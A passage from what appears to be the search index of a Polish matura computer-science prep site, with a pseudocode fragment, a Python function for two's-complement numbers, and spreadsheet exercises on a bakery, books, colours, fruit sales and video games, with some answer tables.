wykonuj:\n    5. prawa := karty[i]\n    6. Je\u017celi lewa_licznik = 0, to:\n        7. lewa_kolor := prawa\n        8. lewa_licznik := 1\n    9. w przeciwnym przypadku, je\u017celi lewa_kolor = prawa, to:\n        10. lewa_licznik := lewa_licznik + 1\n    11. w przeciwnym przypadku, to:\n        12. lewa_licznik := lewa_licznik - 1\n    13. Je\u017celi lewa_licznik &gt; maks_licznik, to:\n        14. maks_licznik := lewa_licznik\n15. Wypisz maks_licznik\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/repetition/repeat-1/solutions/#zadanie-5","title":"Zadanie 5","text":"<ul> <li>Najmniejsza liczba: \\(101010111_{U2}\\)</li> <li>Najwi\u0119ksza liczba: \\(011011110_{U2}\\)</li> </ul> <p>=== Python</p> <pre><code>```python linenums=\"1\"\ndef u2_to_int(u2_num):\n    first_digit = u2_num[0]\n    if first_digit == \"0\":\n        return int(u2_num, 2)\n    return int(u2_num[1:], 2) - 2 ** (len(u2_num) - 1)\n\n\nwith open(\"u2.txt\") as file:\n    u2_numbers = file.read().strip().split()\n\nu2_numbers.sort(key=lambda el: u2_to_int(el))\n\nprint(\"Minimum:\", u2_numbers[0])\nprint(\"Maksimum:\", u2_numbers[-1])\n```\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/repetition/repeat-1/solutions/#zadanie-6","title":"Zadanie 6","text":"<ul> <li>Liczba: 8</li> <li>Pierwszy: 5 kut-kutek</li> <li>Ostatni: 138 fpuh</li> </ul> <p> characters-solution.accdb</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/bakery/","title":"Piekarnia","text":"<p>Pan J\u00f3zef prowadzi piekarni\u0119 w ma\u0142ym miasteczku na uboczu. Piekarnia jest niewielka, a Pan J\u00f3zef prowadzi j\u0105 sam, w zwi\u0105zku z tym wypieka i sprzedaje jedynie chleb. Wypiek jednego bochenka kosztuje \\(50\\) groszy. Poniewa\u017c czasy s\u0105 ci\u0119\u017ckie, Pan J\u00f3zef sprzedaje ka\u017cdy bochenek po \\(2\\) z\u0142ote.</p> <p>Pan J\u00f3zef ka\u017cdego dnia, gdy piekarnia jest otwarta, wypieka \\(200\\) bochenk\u00f3w chleba. Zazwyczaj nie udaje mu si\u0119 wszystkiego sprzeda\u0107, ale zaobserwowa\u0142, \u017ce:</p> <ul> <li>w poniedzia\u0142ki sprzedaje \\(90\\%\\) dost\u0119pnych w piekarni bochenk\u00f3w,</li> <li>we wtorki i czwartki klienci kupuj\u0105 \\(75\\%\\) dost\u0119pnych w piekarni bochenk\u00f3w,</li> <li>w \u015brody schodzi \\(60\\%\\) dost\u0119pnych w piekarni bochenk\u00f3w,</li> <li>w pi\u0105tki sprzedaje \\(80\\%\\) dost\u0119pnych w piekarni bochenk\u00f3w,</li> <li>w soboty i niedziele sprzedaje tylko \\(50\\%\\) dost\u0119pnych w piekarni bochenk\u00f3w.</li> </ul> <p>Poniewa\u017c Pan J\u00f3zef chce sprzedawa\u0107 jedynie \u015bwie\u017cy chleb, to ca\u0142ym chlebem, kt\u00f3ry nie zosta\u0142 sprzedany danego dnia, karmi okoliczne zwierz\u0119ta. Pom\u00f3\u017c Panu J\u00f3zefowi przeprowadzi\u0107 prognoz\u0119 zysk\u00f3w na najbli\u017cszy rok!</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/bakery/#zadanie-1","title":"Zadanie 1","text":"<p>Zgodnie z powy\u017cszymi wytycznymi, dla 2017 roku oblicz:</p> <ul> <li>ile bochenk\u00f3w zostanie sprzedanych,</li> <li>jaki b\u0119dzie ca\u0142kowity przych\u00f3d ze sprzeda\u017cy,</li> <li>jaki b\u0119dzie ca\u0142kowity koszt produkcji chleba,</li> <li>ile bochenk\u00f3w zostanie przeznaczonych na posi\u0142ek dla okolicznych zwierz\u0105t.</li> </ul> <p>Uwaga: Pan J\u00f3zef sprzedaje zawsze pe\u0142ne bochenki chleba. Je\u017celi liczba sprzedanych bochenk\u00f3w chleba nie jest liczb\u0105 ca\u0142kowit\u0105, to zaokr\u0105glamy j\u0105 w g\u00f3r\u0119 do najbli\u017cszej liczby ca\u0142kowitej.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/bakery/#zadanie-2","title":"Zadanie 2","text":"<p>Pan J\u00f3zef zauwa\u017cy\u0142, \u017ce okoliczne zwierz\u0119ta staj\u0105 si\u0119 wyj\u0105tkowo oty\u0142e. Gdyby tego by\u0142o ma\u0142o, zacz\u0119\u0142y go odwiedza\u0107 nied\u017awiedzie! Poniewa\u017c sytuacja zacz\u0119\u0142a robi\u0107 si\u0119 niebezpieczna (nied\u017awiedzie zacz\u0119\u0142y domaga\u0107 si\u0119 g\u0142askania, przez co odci\u0105ga\u0142y klient\u00f3w), Pan J\u00f3zef postanowi\u0142, \u017ce zacznie sprzedawa\u0107 tak\u017ce \"wczorajszy\" chleb. Chleb, kt\u00f3rego nie sprzeda danego dnia, zostawia na nast\u0119pny dzie\u0144 jako \"wczorajszy\" chleb, kt\u00f3ry sprzedaje po z\u0142ot\u00f3wce.</p> <p>Przeprowad\u017a analiz\u0119 dla 2018 roku, zgodnie z dodatkowymi za\u0142o\u017ceniami:</p> <ul> <li>chleb, kt\u00f3ry nie zosta\u0142 sprzedany danego dnia, jest sprzedawany jako \"wczorajszy\" dnia nast\u0119pnego, przy czym Pan J\u00f3zef mo\u017ce przechowywa\u0107 maksymalnie 100 bochenk\u00f3w \"wczorajszego\" chleba, wszelka nadwy\u017cka s\u0142u\u017cy za karm\u0119 dla okolicznych zwierz\u0105t,</li> <li>sprzeda\u017c w poszczeg\u00f3lne dni tygodnia jest taka jak wcze\u015bniej, przy czym zawsze jako pierwszy sprzedawany jest chleb \"wczorajszy\", a dopiero potem \u015bwie\u017cy chleb,</li> <li>je\u017celi \"wczorajszy\" chleb nie zostanie w pe\u0142ni sprzedany, to s\u0142u\u017cy za karm\u0119 dla okolicznych zwierz\u0105t,</li> <li>pierwszego stycznia w piekarni dost\u0119pny jest jedynie \u015bwie\u017cy chleb.</li> </ul> <p>Podobnie jak w poprzednim zadaniu, oblicz:</p> <ul> <li>ile bochenk\u00f3w \u015bwie\u017cego chleba zostanie sprzedanych,</li> <li>ile bochenk\u00f3w \"wczorajszego\" chleba zostanie sprzedanych,</li> <li>jaki b\u0119dzie ca\u0142kowity przych\u00f3d ze sprzeda\u017cy,</li> <li>jaki b\u0119dzie ca\u0142kowity koszt produkcji chleba,</li> <li>ile bochenk\u00f3w zostanie przeznaczonych na posi\u0142ek dla okolicznych zwierz\u0105t.</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/bakery/#zadanie-3","title":"Zadanie 3","text":"<p>Pan J\u00f3zef jest zadowolony ze swojego pomys\u0142u. Nied\u017awiedzie przesta\u0142y si\u0119 pojawia\u0107. Pojawi\u0142 si\u0119 jednak pewien problem, a mianowicie niedziele bez handlu. Piekarnia mo\u017ce by\u0107 otwarta jedynie w ka\u017cd\u0105 pierwsz\u0105 niedziel\u0119 miesi\u0105ca. Pom\u00f3\u017c Panu J\u00f3zefowi przeprowadzi\u0107 analiz\u0119 dla \\(2019\\) roku, zak\u0142adaj\u0105c, \u017ce:</p> <ul> <li>w niedziele bez handlu piekarnia jest zamkni\u0119ta i nie sprzedaje, ani te\u017c nie wypieka chleba,</li> <li>w ka\u017cd\u0105 pierwsz\u0105 niedziel\u0119 miesi\u0105ca handel jest prowadzony tak jak wcze\u015bniej (jak w zadaniu \\(2\\)),</li> <li>w ka\u017cd\u0105 sobot\u0119, po kt\u00f3rej nast\u0119puje niedziela bez handlu, piekarnia sprzedaje teraz 100\\% bochenk\u00f3w chleba na sk\u0142adzie,</li> <li>pozosta\u0142e regu\u0142y s\u0105 jak w poprzednim zadaniu.</li> </ul> <p>Oblicz:</p> <ul> <li>ile bochenk\u00f3w \u015bwie\u017cego chleba zostanie sprzedanych,</li> <li>ile bochenk\u00f3w \"wczorajszego\" chleba zostanie sprzedanych,</li> <li>ile bochenk\u00f3w \u0142\u0105cznie bochenk\u00f3w chleba zostanie sprzedanych w soboty w ca\u0142ym roku,</li> <li>jaki b\u0119dzie ca\u0142kowity przych\u00f3d ze sprzeda\u017cy,</li> <li>jaki b\u0119dzie ca\u0142kowity koszt produkcji chleba,</li> <li>ile bochenk\u00f3w zostanie przeznaczonych na posi\u0142ek dla okolicznych zwierz\u0105t.</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/bakery/#zadanie-4","title":"Zadanie 4","text":"<p>Pan J\u00f3zef postanowi\u0142 w \\(2020\\) roku wprowadzi\u0107 do swojej oferty bu\u0142ki (gdyby tylko wiedzia\u0142, co si\u0119 w tym roku wydarzy...). Koszt wypieku bu\u0142ki wynosi \\(10\\) groszy, a ka\u017cd\u0105 bu\u0142k\u0119 Pan J\u00f3zef sprzedaje po \\(50\\) groszy. Ze wzgl\u0119du na du\u017cy nak\u0142ad pracy, bu\u0142ki s\u0105 wypiekane jedynie w poniedzia\u0142ki i pi\u0105tki. W poniedzia\u0142ki wypiekanych jest \\(150\\) bu\u0142ek, natomiast w pi\u0105tki \\(90\\) bu\u0142ek. Pan J\u00f3zef z zadowoleniem zaobserwowa\u0142, \u017ce zawsze sprzedaje wszystkie bu\u0142ki wyprodukowane danego dnia. Niestety, sprzeda\u017c bu\u0142ek wp\u0142yn\u0119\u0142a negatywnie na sprzeda\u017c chleba w poniedzia\u0142ki i pi\u0105tki. W te dni Pan J\u00f3zef sprzedaje teraz o \\(10\\) punkt\u00f3w procentowych mniej bochenk\u00f3w (tzn. gdy wcze\u015bniej sprzedawa\u0142 ich \\(90\\%\\), teraz sprzedaje \\(80\\%\\)).</p> <p>Uzupe\u0142niaj\u0105c za\u0142o\u017cenia z poprzednich zada\u0144 o sprzeda\u017c bu\u0142ek, dla \\(2020\\) roku oblicz:</p> <ul> <li>ile bochenk\u00f3w \u015bwie\u017cego chleba zostanie sprzedanych,</li> <li>ile bochenk\u00f3w \"wczorajszego\" chleba zostanie sprzedanych,</li> <li>ile bu\u0142ek zostanie sprzedanych,</li> <li>jaki b\u0119dzie ca\u0142kowity przych\u00f3d ze sprzeda\u017cy,</li> <li>jaki b\u0119dzie ca\u0142kowity koszt produkcji chleba i bu\u0142ek,</li> <li>ile bochenk\u00f3w zostanie przeznaczonych na posi\u0142ek dla okolicznych zwierz\u0105t.</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/bakery/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/bakery/answers/#zadanie-1","title":"Zadanie 1","text":"Liczba sprzedanych bochenk\u00f3w Przych\u00f3d ze sprzeda\u017cy Koszt produkcji Liczba bochenk\u00f3w dla zwierz\u0105t 50020 100040 36500 22980"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/bakery/answers/#zadanie-2","title":"Zadanie 2","text":"Liczba sprzedanych \u015bwie\u017cych bochenk\u00f3w Liczba sprzedanych wczorajszych bochenk\u00f3w Przych\u00f3d ze sprzeda\u017cy Koszt produkcji Liczba bochenk\u00f3w dla zwierz\u0105t 41990 26872 110 852,00 z\u0142 36 500,00 z\u0142 4108"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/bakery/answers/#zadanie-3","title":"Zadanie 3","text":"Liczba sprzedanych \u015bwie\u017cych bochenk\u00f3w Liczba sprzedanych wczorajszych bochenk\u00f3w Sprzedane bochenki w soboty Przych\u00f3d ze sprzeda\u017cy Koszt produkcji Liczba bochenk\u00f3w dla zwierz\u0105t 45520 18399 11736 109 439,00 z\u0142 32 500,00 z\u0142 1026"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/bakery/answers/#zadanie-4","title":"Zadanie 4","text":"Liczba sprzedanych \u015bwie\u017cych bochenk\u00f3w Liczba sprzedanych wczorajszych bochenk\u00f3w Liczba sprzedanych bu\u0142ek Przych\u00f3d ze sprzeda\u017cy Koszt produkcji Liczba bochenk\u00f3w dla zwierz\u0105t 42464 21338 12480 112 506,00 z\u0142 33 848,00 z\u0142 1323"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/bakery/solution/","title":"Rozwi\u0105zanie","text":"<p> Rozwi\u0105zanie</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/books/","title":"Ksi\u0105\u017cki","text":"<p>W pliku ksiazki.txt znajduje si\u0119 zestawienie najpopularniejszych ksi\u0105\u017cek, pod wzgl\u0119dem liczby sprzedanych kopii. Ka\u017cda linia zawiera nast\u0119puj\u0105ce informacje:</p> <ul> <li>tytu\u0142 ksi\u0105\u017cki,</li> <li>autor ksi\u0105\u017cki,</li> <li>j\u0119zyk orygina\u0142u,</li> <li>rok pierwszej publikacji,</li> <li>szacunkowa liczba sprzedanych sztuk w milionach,</li> <li>gatunek literacki.</li> </ul> <p>Dane oddzielone s\u0105 tabulacjami. Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn.</p> <p> ksiazki.txt</p> <p>\u0179r\u00f3d\u0142o danych: https://www.kaggle.com/datasets/drahulsingh/best-selling-books</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/books/#zadanie-1","title":"Zadanie 1","text":"<p>Wypisz wszystkie nazwiska autor\u00f3w wyst\u0119puj\u0105cych w zestawieniu. Nast\u0119pnie oblicz, ile ksi\u0105\u017cek opublikowa\u0142 autor o takim nazwisku, oraz ile \u0142\u0105cznie sztuk tych ksi\u0105\u017cek (w milionach) zosta\u0142o sprzedanych.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/books/#zadanie-2","title":"Zadanie 2","text":"<p>Dla ka\u017cdego autora policz, ile imion on posiada. Imiona s\u0105 zawsze wymienione przed nazwiskiem i zaczynaj\u0105 si\u0119 od wielkiej litery (w pe\u0142nej lub skr\u00f3conej formie), a nazwisko jest zawsze ostatnim wyrazem.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/books/#zadanie-3","title":"Zadanie 3","text":"<p>Dla ka\u017cdej litery alfabetu oblicz, ile jest ksi\u0105\u017cek, kt\u00f3rych tytu\u0142 zaczyna si\u0119 od tej litery. Uwaga: w tytu\u0142ach ksi\u0105\u017cek zignoruj \"The\". Np. je\u017celi tytu\u0142 ksi\u0105\u017cki to \"The Help\" przyjmujemy, \u017ce pierwsza litera tytu\u0142u to \"H\".</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/books/#zadanie-4","title":"Zadanie 4","text":"<p>Oblicz, ile jest ksi\u0105\u017cek, kt\u00f3re: - nie maj\u0105 zdefiniowanego gatunku, - maj\u0105 dok\u0142adnie jeden gatunek, - maj\u0105 dwa lub wi\u0119cej gatunk\u00f3w.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/books/#zadanie-5","title":"Zadanie 5","text":"<p>Oblicz, ile ksi\u0105\u017cek zosta\u0142o opublikowanych w poszczeg\u00f3lnych stuleciach, poczynaj\u0105c od roku 1700.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/books/#zadanie-6","title":"Zadanie 6","text":"<p>Oblicz, ile jest ksi\u0105\u017cek, kt\u00f3re w gatunku maj\u0105 zapis \"novel\" lub \"Novel\".</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/books/#zadnie-7","title":"Zadnie 7","text":"<p>Dla ka\u017cdego autora oblicz, ile jest lat, w kt\u00f3rych opublikowa\u0142 przynajmniej jedn\u0105 ksi\u0105\u017ck\u0119.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/books/#zadanie-8","title":"Zadanie 8","text":"<p>Utw\u00f3rz zestawienie pokazuj\u0105ce procentowy udzia\u0142 ka\u017cdego j\u0119zyka w liczbie sprzedanych sztuk ksi\u0105\u017cek.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/books/solution/","title":"Rozwi\u0105zanie","text":"<p> Rozwi\u0105zanie</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/colours/","title":"Kolory","text":"<p>W pliku kolory.txt znajduje si\u0119 \\(100\\) kolor\u00f3w zapisanych w formacie szesnastkowym. Ka\u017cda linia zawiera jeden kolor, kt\u00f3rego zapis zaczyna si\u0119 od znaku #, po kt\u00f3rym nast\u0119puje \\(6\\) znak\u00f3w alfanumerycznych: cyfr od \\(0\\) do \\(9\\) oraz liter od \\(a\\) do \\(f\\). Pierwszy wiersz zawiera nag\u0142\u00f3wek kolumny.</p> <p>Kolor zapisany w formacie szesnastkowym interpretujemy nast\u0119puj\u0105co:</p> <ul> <li>pierwsze dwa znaki szesnastkowe oznaczaj\u0105 sk\u0142adow\u0105 czerwon\u0105 (Red),</li> <li>kolejne dwa znaki szesnastkowe oznaczaj\u0105 sk\u0142adow\u0105 zielon\u0105 (Green),</li> <li>ostatnie dwa znaki szesnastkowe oznaczaj\u0105 sk\u0142adow\u0105 niebiesk\u0105 (Blue).</li> </ul> <p>Ka\u017cda z om\u00f3wionych par znak\u00f3w szesnastkowych reprezentuje liczb\u0119 w systemie szesnastkowym, kt\u00f3rej warto\u015b\u0107 w systemie dziesi\u0119tnym mie\u015bci si\u0119 w przedziale \\(&lt;0, 255&gt;\\).</p> <p> kolory.txt</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/colours/#zadanie-1","title":"Zadanie 1","text":"<p>Ka\u017cdy z kolor\u00f3w przedstaw w postaci trzech warto\u015bci w systemie dziesi\u0119tnym w zapisie RGB.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/colours/#zadanie-2","title":"Zadanie 2","text":"<p>Dla ka\u017cdego koloru policz, kt\u00f3ra ze sk\u0142adowych RGB ma najwi\u0119ksz\u0105 warto\u015b\u0107. Je\u017celi wi\u0119cej ni\u017c jedna sk\u0142adowa maj\u0105 najwi\u0119ksz\u0105 warto\u015b\u0107, to wypisz t\u0119, kt\u00f3ra jest pierwsza w kolejno\u015bci RGB. Dla ka\u017cdej sk\u0142adowej policz, ile razy jej warto\u015b\u0107 by\u0142a najwi\u0119ksza. Wyniki przedstaw na wykresie ko\u0142owym. Zadbaj o czytelno\u015b\u0107 wykresu i przedstawienie procentowych warto\u015bci. Dobierz kolory wykresu tak, by odpowiada\u0142y kolorom sk\u0142adowych.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/colours/#zadanie-3","title":"Zadanie 3","text":"<p>Korzystaj\u0105c z poni\u017cszych r\u00f3wna\u0144 przedstaw ka\u017cdy kolor w formacie CMYK.</p> <p>$ Black(K)=1-(max(R,G,B)/255)\\ Cyan=(1-(R/255)-K)/(1-K)\\ Magenta=(1-(G/255)-K)/(1-K)\\ Yellow=(1-(B/255)-K)/(1-K) $</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/colours/#zadanie-4","title":"Zadanie 4","text":"<p>Dla ka\u017cdego znaku szesnastkowego policz, ile razy \u0142\u0105cznie wyst\u0105pi\u0142 w zapisach wszystkich kolor\u00f3w. Wyniki przedstaw na wykresie kolumnowym. Zadbaj o czytelno\u015b\u0107 wykresu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/colours/solution/","title":"Rozwi\u0105zanie","text":"<p> Rozwi\u0105zanie</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/fruits/","title":"Owoce","text":"<p>W pliku owoce_sprzedaz.txt znajduje si\u0119 \\(1000\\) linii zawieraj\u0105cych informacje na temat transakcji dokonanych w pewnym sklepie owocowym. Ka\u017cda linia zawiera jeden wyraz i liczb\u0119 naturaln\u0105 oddzielone spacj\u0105. Wyraz jest nazw\u0105 owocu, a liczba oznacza, ile sztuk owocu zosta\u0142o sprzedanych. Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn.</p> <p>Plik owoce_ceny.txt zawiera informacj\u0119 na temat ceny ka\u017cdego owocu podanej w polskich z\u0142otych. Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn.</p> <p> owoce_sprzedaz.txt</p> <p> owoce_ceny.txt</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/fruits/#zadanie-1","title":"Zadanie 1","text":"<p>Dla ka\u017cdego owocu wypisz w ilu transakcjach bra\u0142 udzia\u0142. Wynik przedstaw w postaci dwukolumnowej tabeli zawieraj\u0105cej nazw\u0119 owocu oraz liczb\u0119 jego wyst\u0105pie\u0144, posortowanej alfabetycznie po nazwach owoc\u00f3w. Utw\u00f3rz wykres ko\u0142owy na podstawie uzyskanych warto\u015bci. Zadbaj o czytelny opis wykresu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/fruits/#zadanie-2","title":"Zadanie 2","text":"<p>Dla ka\u017cdego owocu wypisz ca\u0142kowity zysk z jego sprzeda\u017cy, tzn. liczb\u0119 sprzedanych sztuk przemno\u017con\u0105 przez cen\u0119 owocu. Wyniki posortuj alfabetycznie po owocach, zaokr\u0105glij do dw\u00f3ch miejsc po przecinku i przedstaw na wykresie kolumnowym. Zadbaj o czytelny opis wykresu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/fruits/#zadanie-3","title":"Zadanie 3","text":"<p>Dla ka\u017cdego owocu policz liczb\u0119 sprzedanych sztuk w pierwszych \\(100\\), \\(500\\) i \\(1000\\) transakcji. Wyniki posortuj alfabetycznie po owocach i przedstaw na wykresie kolumnowym. Zadbaj o czytelny opis wykresu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/fruits/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/fruits/answers/#zadanie-1","title":"Zadanie 1","text":"Owoc Liczba transakcji Agrest 22 Ananas 23 Arbuz 33 Aronia 32 Awokado 24 Banan 32 Brzoskwinia 31 Cytryna 25 Daktyl 30 Figa 28 Granat 22 Grejpfrut 23 Gruszka 27 Guawa 22 Jagoda 23 Kaki 27 Kiwi 21 Kokos 22 Kumkwat 22 Liczi 29 Limonka 22 Malina 35 Mandarynka 34 Mango 32 Melon 28 Morela 24 Nektarynka 34 Opuncja 28 Papaja 32 Pigwa 29 Porzeczka 30 Poziomka 24 Renkloda 29 Rokitnik 24 Tarnina 22 Truskawka 20 Winogrono 35"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/fruits/answers/#zadanie-2","title":"Zadanie 2","text":"Owoc ** Zysk ze sprzeda\u017cy ** Agrest 283,80 z\u0142 Ananas 143,84 z\u0142 Arbuz 1 486,08 z\u0142 Aronia 317,58 z\u0142 Awokado 147,60 z\u0142 Banan 1 510,50 z\u0142 Brzoskwinia 2 272,11 z\u0142 Cytryna 1 326,75 z\u0142 Daktyl 230,16 z\u0142 Figa 1 449,78 z\u0142 Granat 1 041,90 z\u0142 Grejpfrut 2 240,28 z\u0142 Gruszka 2 706,18 z\u0142 Guawa 2 132,48 z\u0142 Jagoda 939,00 z\u0142 Kaki 858,48 z\u0142 Kiwi 939,84 z\u0142 Kokos 1 985,92 z\u0142 Kumkwat 795,96 z\u0142 Liczi 1 209,16 z\u0142 Limonka 1 048,75 z\u0142 Malina 4 209,68 z\u0142 Mandarynka 1 452,50 z\u0142 Mango 1 617,77 z\u0142 Melon 801,90 z\u0142 Morela 990,36 z\u0142 Nektarynka 1 139,06 z\u0142 Opuncja 2 571,53 z\u0142 Papaja 1 787,46 z\u0142 Pigwa 861,72 z\u0142 Porzeczka 2 899,26 z\u0142 Poziomka 451,01 z\u0142 Renkloda 2 330,16 z\u0142 Rokitnik 1 121,90 z\u0142 Tarnina 1 734,76 z\u0142 Truskawka 2 163,65 z\u0142 Winogrono 1 962,36 z\u0142"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/fruits/answers/#zadanie-3","title":"Zadanie 3","text":"Owoc Pierwsze 100 transakcji Pierwsze 500 transakcji Pierwsze 1000 transakcji Agrest 13 81 110 Ananas 2 61 116 Arbuz 16 77 192 Aronia 18 82 158 Awokado 16 60 120 Banan 13 75 190 Brzoskwinia 17 86 159 Cytryna 0 81 145 Daktyl 20 94 168 Figa 47 104 146 Granat 43 61 115 Grejpfrut 10 82 127 Gruszka 0 70 138 Guawa 18 76 136 Jagoda 42 70 150 Kaki 16 61 146 Kiwi 9 39 132 Kokos 10 50 116 Kumkwat 10 38 134 Liczi 20 111 172 Limonka 4 42 125 Malina 12 79 202 Mandarynka 4 84 175 Mango 0 80 191 Melon 23 82 135 Morela 7 52 126 Nektarynka 28 104 169 Opuncja 4 75 131 Papaja 32 115 186 Pigwa 25 81 172 Porzeczka 6 64 177 Poziomka 15 72 119 Renkloda 20 83 168 Rokitnik 15 84 130 Tarnina 12 30 124 Truskawka 3 62 109 Winogrono 41 106 207"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/fruits/solution/","title":"Rozwi\u0105zanie","text":"<p> Rozwi\u0105zanie</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/games/","title":"Gry","text":"<p>W pliku gry.txt znajduj\u0105 si\u0119 informacje na temat \\(100\\) najpopularniejszych gier pod k\u0105tem recenzji z platformy Metacritic. Ka\u017cda linia zawiera nast\u0119puj\u0105ce informacje:</p> <ul> <li>pozycj\u0119 gry w rankingu,</li> <li>tytu\u0142 gry,</li> <li>platforma, na kt\u00f3rej gra zosta\u0142a wydana,</li> <li>ocena punktowa gry w serwisie Metascore,</li> <li>data publikacji gry.</li> </ul> <p>Dane oddzielone s\u0105 znakiem tabulacji. Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn.</p> <p> gry.txt</p> <p>\u0179r\u00f3d\u0142o danych: https://www.kaggle.com/datasets/faisaljanjua0555/best-video-games-of-all-time</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/games/#zadanie-1","title":"Zadanie 1","text":"<p>Dla ka\u017cdego roku publikacji, kt\u00f3ry pojawia si\u0119 w zestawieniu, policz liczb\u0119 gier opublikowanych w tym roku. Dane przedstaw na wykresie liniowym. Zadbaj o czytelno\u015b\u0107 wykresu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/games/#zadanie-2","title":"Zadanie 2","text":"<p>Dla ka\u017cdego miesi\u0105ca w roku policz liczb\u0119 gier opublikowanych w tym miesi\u0105cu, a tak\u017ce liczb\u0119 r\u00f3\u017cnych platform, na kt\u00f3rych te gry zosta\u0142y wydane. Dane przedstaw na wykresie. Zadbaj o czytelno\u015b\u0107 wykresu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/games/#zadanie-3","title":"Zadanie 3","text":"<p>Dla ka\u017cdej platformy, kt\u00f3ra pojawia si\u0119 w zestawieniu, policz \u015bredni, minimalny oraz maksymalny wynik oceny punktowej wszystkich gier z tej platformy. Wyniki przedstaw z dok\u0142adno\u015bci\u0105 do dw\u00f3ch miejsc po przecinku i zaprezentuj je na wykresie kolumnowym, posortowane po nazwie platformy. Zadbaj o czytelno\u015b\u0107 wykresu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/games/#zadanie-4","title":"Zadanie 4","text":"<p>Przedstaw na wykresie ko\u0142owym udzia\u0142 procentowy ka\u017cdej platformy w podanym zestawieniu gier. Zadbaj o czytelno\u015b\u0107 wykresu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/games/#zadanie-5","title":"Zadanie 5","text":"<p>Dla ka\u017cdej platformy zapisz najwy\u017csz\u0105 pozycj\u0119 w rankingu, jak\u0105 uzyska\u0142y gry z tej platformy. Wyniki posortuj po nazwie platformy i przedstaw na wykresie. Zadbaj o czytelno\u015b\u0107 wykresu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/games/#zadanie-6","title":"Zadanie 6","text":"<p>Dla ka\u017cdego roku z zestawienia podaj tytu\u0142 gry i nazw\u0119 platformy, kt\u00f3ra uzyska\u0142a najlepsz\u0105 pozycj\u0119 w rankingu w danym roku.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/games/#zadanie-7","title":"Zadanie 7","text":"<p>Policz r\u00f3\u017cnice punktowe pomi\u0119dzy kolejnymi pozycjami w rankingu. Dane przedstaw na wykresie. Zadbaj o czytelno\u015b\u0107 wykresu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/games/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/games/answers/#zadanie-1","title":"Zadanie 1","text":""},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/games/answers/#zadanie-2","title":"Zadanie 2","text":""},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/games/answers/#zadanie-3","title":"Zadanie 3","text":""},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/games/answers/#zadanie-4","title":"Zadanie 4","text":""},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/games/answers/#zadanie-5","title":"Zadanie 5","text":""},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/games/answers/#zadanie-6","title":"Zadanie 6","text":"Rok Tytu\u0142 Platforma 1996 Sid Meier's Civilization II PC 1997 GoldenEye 007 Nintendo 64 1998 The Legend of Zelda: Ocarina of Time Nintendo 64 1999 SoulCalibur Dreamcast 2000 Tony Hawk's Pro Skater 2 PlayStation 2001 Tony Hawk's Pro Skater 3 PlayStation 2 2002 Metroid Prime GameCube 2003 The Legend of Zelda: The   Wind Waker GameCube 2004 Half-Life 2 PC 2005 Resident Evil 4 GameCube 2006 The Legend of Zelda: Twilight Princess GameCube 2007 Super Mario Galaxy Wii 2008 Grand Theft Auto IV PlayStation 3 2009 Uncharted 2: Among Thieves PlayStation 3 2010 Super Mario Galaxy 2 Wii 2011 Batman: Arkham City PlayStation 3 2013 Grand Theft Auto V PlayStation 3 2014 Grand Theft Auto V Xbox One 2015 Grand Theft Auto V PC 2017 The Legend of Zelda:   Breath of the 